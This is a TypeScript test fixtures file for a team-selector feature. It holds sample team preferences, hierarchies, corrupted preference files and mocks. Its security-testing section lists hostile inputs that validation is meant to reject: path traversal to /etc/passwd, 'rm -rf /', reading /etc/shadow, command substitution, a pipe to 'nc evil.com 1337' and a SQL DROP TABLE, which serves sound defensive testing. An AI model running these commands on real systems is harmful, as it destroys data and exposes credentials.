/**
 * Test Fixtures for Team Selector Tests
 *
 * Provides sample data for unit and integration tests including:
 * - Valid team preferences
 * - Teams with hierarchy structures
 * - Invalid/malicious inputs for security testing
 * - Corrupted preferences for recovery testing
 * - Edge cases (circular references, unicode)
 */

import type { TeamPreference, TeamFromAPI, PreferencesFile } from '../schemas.js';

/**
 * Valid team preference example
 */
export const validTeamPreference: TeamPreference = {
  id: 'team-123',
  name: 'Engineering',
  setAt: '2025-12-30T10:00:00.000Z',
  lastUsedAt: '2025-12-30T15:00:00.000Z',
};

/**
 * Multiple valid team preferences for recent teams testing
 */
export const recentTeamPreferences: TeamPreference[] = [
  {
    id: 'team-123',
    name: 'Engineering',
    setAt: '2025-12-30T10:00:00.000Z',
    lastUsedAt: '2025-12-30T15:00:00.000Z',
  },
  {
    id: 'team-456',
    name: 'Product',
    setAt: '2025-12-29T10:00:00.000Z',
    lastUsedAt: '2025-12-29T14:00:00.000Z',
  },
  {
    id: 'team-789',
    name: 'Design',
    setAt: '2025-12-28T10:00:00.000Z',
  },
];

/**
 * Teams with hierarchical structure (parents and sub-teams)
 */
export const teamsWithHierarchy: TeamFromAPI[] = [
  // Parent teams
  {
    id: 'parent-eng',
    name: 'Engineering',
  },
  {
    id: 'parent-prod',
    name: 'Product',
  },
  // Sub-teams under Engineering
  {
    id: 'sub-frontend',
    name: 'Frontend',
    parent: {
      id: 'parent-eng',
      name: 'Engineering',
    },
  },
  {
    id: 'sub-backend',
    name: 'Backend',
    parent: {
      id: 'parent-eng',
      name: 'Engineering',
    },
  },
  {
    id: 'sub-infra',
    name: 'Infrastructure',
    parent: {
      id: 'parent-eng',
      name: 'Engineering',
    },
  },
  // Sub-teams under Product
  {
    id: 'sub-pm',
    name: 'Product Management',
    parent: {
      id: 'parent-prod',
      name: 'Product',
    },
  },
  {
    id: 'sub-analytics',
    name: 'Analytics',
    parent: {
      id: 'parent-prod',
      name: 'Product',
    },
  },
];

/**
 * Invalid team IDs for security testing
 * These should all fail validation
 */
export const invalidTeamIds = {
  pathTraversal: '../../../etc/passwd',
  commandInjection: 'team-123; rm -rf /',
  shellMetachars: 'team-123 && cat /etc/shadow',
  nullByte: 'team-123\x00hidden',
  controlChars: 'team-\x01\x02\x03',
  backslashTraversal: '..\\..\\windows\\system32',
  homeDir: '~/sensitive/file',
  commandSubstitution: 'team-$(whoami)',
  backtickExec: 'team-`ls -la`',
  pipeInjection: 'team-123 | nc evil.com 1337',
};

/**
 * Invalid team names for validation testing
 */
export const invalidTeamNames = {
  tooLong: 'a'.repeat(300), // Exceeds MAX_NAME_LENGTH (256)
  empty: '',
  pathTraversal: '../../../sensitive',
  commandInjection: 'Team; DROP TABLE teams;--',
  controlChars: 'Team\x00Name',
};

/**
 * Corrupted preferences files for recovery testing
 */
export const corruptedPreferencesFiles = {
  malformedJSON: '{"version": 1, "linear": {',
  invalidVersion: JSON.stringify({ version: 999, linear: {} }),
  missingVersion: JSON.stringify({ linear: {} }),
  nullLinear: JSON.stringify({ version: 1, linear: null }),
  invalidTeamId: JSON.stringify({
    version: 1,
    linear: {
      defaultTeam: {
        id: '../../../etc/passwd',
        name: 'Hacked',
        setAt: '2025-12-30T10:00:00.000Z',
      },
    },
  }),
  invalidDateFormat: JSON.stringify({
    version: 1,
    linear: {
      defaultTeam: {
        id: 'team-123',
        name: 'Engineering',
        setAt: 'not-a-date',
      },
    },
  }),
  tooManyRecentTeams: JSON.stringify({
    version: 1,
    linear: {
      recentTeams: Array.from({ length: 10 }, (_, i) => ({
        id: `team-${i}`,
        name: `Team ${i}`,
        setAt: '2025-12-30T10:00:00.000Z',
      })),
    },
  }),
};

/**
 * Circular parent-team references (should handle gracefully)
 */
export const circularParentTeams: TeamFromAPI[] = [
  {
    id: 'team-a',
    name: 'Team A',
    parent: {
      id: 'team-b',
      name: 'Team B',
    },
  },
  {
    id: 'team-b',
    name: 'Team B',
    parent: {
      id: 'team-a', // Circular reference
      name: 'Team A',
    },
  },
];

/**
 * Unicode team names for internationalization testing
 */
export const unicodeTeamNames: TeamFromAPI[] = [
  {
    id: 'team-jp',
    name: 'エンジニアリング', // Japanese: Engineering
  },
  {
    id: 'team-cn',
    name: '工程团队', // Chinese: Engineering Team
  },
  {
    id: 'team-kr',
    name: '엔지니어링', // Korean: Engineering
  },
  {
    id: 'team-ar',
    name: 'الهندسة', // Arabic: Engineering
  },
  {
    id: 'team-ru',
    name: 'Инженерия', // Russian: Engineering
  },
  {
    id: 'team-emoji',
    name: '🚀 Rocket Team 🚀',
  },
];

/**
 * Valid preferences file for integration testing
 */
export const validPreferencesFile: PreferencesFile = {
  version: 1,
  linear: {
    defaultTeam: {
      id: 'team-123',
      name: 'Engineering',
      setAt: '2025-12-30T10:00:00.000Z',
      lastUsedAt: '2025-12-30T15:00:00.000Z',
    },
    recentTeams: [
      {
        id: 'team-456',
        name: 'Product',
        setAt: '2025-12-29T10:00:00.000Z',
        lastUsedAt: '2025-12-29T14:00:00.000Z',
      },
      {
        id: 'team-789',
        name: 'Design',
        setAt: '2025-12-28T10:00:00.000Z',
      },
    ],
  },
};

/**
 * Empty preferences file (new user)
 */
export const emptyPreferencesFile: PreferencesFile = {
  version: 1,
};

/**
 * Flat team list (no hierarchy) for testing
 */
export const flatTeamList: TeamFromAPI[] = [
  { id: 'team-1', name: 'Alpha Team' },
  { id: 'team-2', name: 'Beta Team' },
  { id: 'team-3', name: 'Gamma Team' },
  { id: 'team-4', name: 'Delta Team' },
];

/**
 * Mock clock for time-dependent tests
 */
export const mockClock = {
  now: () => new Date('2025-12-30T16:00:00.000Z'),
};

/**
 * Mock PreferenceManager for integration tests
 */
export class MockPreferenceManager {
  private storage: Map<string, any> = new Map();

  constructor(private service: string) {}

  async load<T>(schema: any): Promise<any> {
    const data = this.storage.get(this.service);
    if (!data) {
      return { ok: false, error: { code: 'NOT_FOUND' } };
    }
    try {
      const validated = schema.parse(data);
      return { ok: true, value: validated };
    } catch (error) {
      return { ok: false, error: { code: 'SCHEMA_INVALID', message: String(error) } };
    }
  }

  async save<T>(data: T, schema: any): Promise<any> {
    try {
      schema.parse(data);
      this.storage.set(this.service, data);
      return { ok: true, value: undefined };
    } catch (error) {
      return { ok: false, error: error instanceof Error ? error : new Error(String(error)) };
    }
  }

  async delete(): Promise<any> {
    const existed = this.storage.has(this.service);
    this.storage.delete(this.service);
    return { ok: true, value: existed };
  }

  // Test helper: inspect storage
  _inspect() {
    return this.storage.get(this.service);
  }
}

/**
 * Mock listTeams function for integration tests
 */
export function createMockListTeams(teams: TeamFromAPI[]) {
  return async () => ({
    teams,
    totalTeams: teams.length,
    estimatedTokens: 0,
  });
}
